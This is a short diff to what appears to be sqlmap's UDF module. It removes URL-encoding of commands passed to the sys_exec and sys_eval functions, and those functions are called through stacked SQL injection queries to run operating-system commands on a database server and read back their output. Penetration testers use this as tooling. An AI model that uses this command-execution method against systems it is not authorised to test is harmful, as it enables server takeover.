@@ -12,7 +12,6 @@ import os
 from lib.core.agent import agent
 from lib.core.common import dataToStdout
 from lib.core.common import readInput
-from lib.core.convert import urlencode
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -80,7 +79,6 @@ class UDF:
             udfName = "sys_exec"
 
         cmd = unescaper.unescape(cmd)
-        cmd = urlencode(cmd, convall=True)
 
         inject.goStacked("SELECT %s(%s)" % (udfName, cmd), silent)
 
@@ -90,7 +88,6 @@ class UDF:
             udfName = "sys_eval"
 
         cmd = unescaper.unescape(cmd)
-        cmd = urlencode(cmd, convall=True)
 
         inject.goStacked("INSERT INTO %s(%s) VALUES (%s(%s))" % (self.cmdTblName, self.tblField, udfName, cmd))
         output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last)
